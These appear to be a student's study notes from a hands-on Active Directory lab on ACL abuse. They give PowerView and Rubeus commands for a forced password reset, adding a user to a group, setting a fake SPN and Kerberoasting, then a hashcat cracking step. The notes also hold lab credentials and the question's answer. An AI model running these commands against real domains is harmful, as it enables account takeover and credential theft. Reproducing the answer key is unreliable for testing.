

>[!tip]
> Authenticate as the `wley` user and change the password for `damundsen`.
> Then authenticate as `damundsen` and leverage GenericWrite rights to add `damundsen` to Help Desk Level 1 group.
> Inheriting the group membership of the IT group, leverage the GenericAll rights to control of the `adunn` user
> 
##### Creating a PSCredential Object

Authenticate as `wley` and force change `damundsen`'s password.
```go
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
```

```go
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

##### Creating a SecureString Object

Set the password for the targeted user `damundsen`
```go
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

##### Changing/Reset the User's Password
```go
Import-Module .\PowerView.ps1
```

```go
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

##### Creating a SecureString Object using damundsen
>[!note]
> The following processes allow you to authenticate as `damundsen`

```go
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

```go
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
```

##### Adding damundsen to the target group, Help Desk Level 1
```go
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
```

```go
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```

##### Confirming damundsen was Added to the Group
```go
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```

>[!Info]
> Perform a targeted Kerberoasting attack by modifying the account's [servicePrincipalName attribute](https://docs.microsoft.com/en-us/windows/win32/adschema/a-serviceprincipalname) to create a fake SPN that we can then Kerberoast to obtain the TGS ticket and (hopefully) crack the hash offline using Hashcat. This can be done because the 

##### Creating a Fake SPN
```go
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

if all worked, you will be able to KERBEROAST the user

##### Kerberoasting with Rubeus
```go
.\Rubeus.exe kerberoast /user:adunn /nowrap
```

------------------------------------------------------------------------
# Questions

### Work through the examples in this section to gain a better understanding of ACL abuse and performing these skills hands-on. Set a fake SPN for the adunn account, Kerberoast the user, and crack the hash using Hashcat. Submit the account's cleartext password as your answer.

Answer
```go
SyncMaster757
```


RDP
```go
xfreerdp /v:10.129.45.234 /u:htb-student /p:'Academy_student_AD!' /drive:HTB,/home/dan/Desktop/HTB/13-Active-Directory-Enumeration-And-Attacks/ACE /smart-sizing:2400x1200 /cert:ignore
```

wley's password
```go
transporter@4
```

First, create a PSCredential Object. 
```go
$SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
```

```go
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

Now change `damundsen`'s password
```go
Import-Module .\PowerView.ps1
```

```go
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

And create the SecureString object with `damundsen`
```go
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

```go
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
```

Add user to Help Desk Level 1
```go
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
```

```go
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```

Confirm addition to group....
```go
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```

##### Creating a Fake SPN

>[!TIP] 
>
>Remember SPNs are used to map a service to an account, hence "service accounts". We have GenericAll rights over the `adunn` user. We can perform a Kerberoast is attack against the accounts SPN to by creating a fake SPN and then Kerberoasting that, obtaining the ticket and cracking offline.
>
>Adding `damundsen` to the Help Desk Level 1, we've inherited those rights via inheritance. Use the Set-DomainObject to create fake SPNs.

Get hash with Rubeus
```go
.\Rubeus.exe kerberoast /user:adunn /nowrap
```

 ```go
 hashcat -m 13100 fakespn_hash /usr/share/wordlists/rockyou.txt
 ```